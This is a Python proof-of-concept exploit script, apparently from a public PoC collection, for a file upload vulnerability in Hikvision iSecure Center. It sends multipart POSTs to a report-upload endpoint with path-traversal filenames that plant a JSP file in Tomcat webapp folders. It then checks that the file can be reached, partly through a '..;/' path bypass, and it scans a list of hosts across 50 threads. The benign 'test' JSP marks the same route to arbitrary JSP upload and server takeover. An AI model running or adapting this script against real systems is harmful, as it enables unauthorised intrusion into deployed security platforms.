#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# icon_hash="-911494769"
# icon_hash="-1605849932"

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings()
if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                      +')
    print(
        '+ EXP: python3 Hikvison_iSecure_Center_Report_Upload_File_Poc.py url.txt                                   +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8081'
}  
#../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp
#../../../tomcat85linux64.1/webapps/els/static/test.jsp
def exp(host):
    if "http" in host:
        url = host
    else:
        url ="https://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundary9PggsiM755PLa54a",
        "Host": "%s" %host2
    }
    headers2 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Accept": "*/*",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate,br",
        "Host": "%s" %host2
    }
    data ='------WebKitFormBoundary9PggsiM755PLa54a\r\nContent-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/test.jsp"\r\nContent-Type:application/zip\r\n\r\n<%out.print("test");%>\r\n\r\n------WebKitFormBoundary9PggsiM755PLa54a--'
    data2='------WebKitFormBoundary9PggsiM755PLa54a\r\nContent-Disposition: form-data; name="file"; filename="../../../tomcat85linux64.1/webapps/els/static/test.jsp"\r\nContent-Type:application/zip\r\n\r\n<%out.print("test");%>\r\n\r\n------WebKitFormBoundary9PggsiM755PLa54a--'
    vulurl = url + "/svm/api/external/report"
    vulurl2= url+"/portal/ui/login/..;/..;/test.jsp"
    vulurl3= url+"/els/static/test.jsp"
    try:
        r = requests.post(vulurl, headers=headers,data=data,verify=False)
        r4 = requests.post(vulurl, headers=headers,data=data2,verify=False)
        if  "code" in r.text or "code" in r4.text :
            print(url+"存在上传接口")
            r2=requests.get(vulurl2,headers=headers2,verify=False)
            if r2.status_code==200 and "test" in r2.text:
                print(url+"/portal/ui/login/..;/..;/test.jsp")
            r3=requests.get(vulurl3,headers=headers2,verify=False)
            if r3.status_code==200 and "test" in r3.text:
                print(url+"/els/static/test.jsp")
            #print("http://"+host+":true 文件地址为："+"")
        else:
            return 0
            print (host+":false")
    except:
        return 0
        print (host+":false")


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(exp, row[0])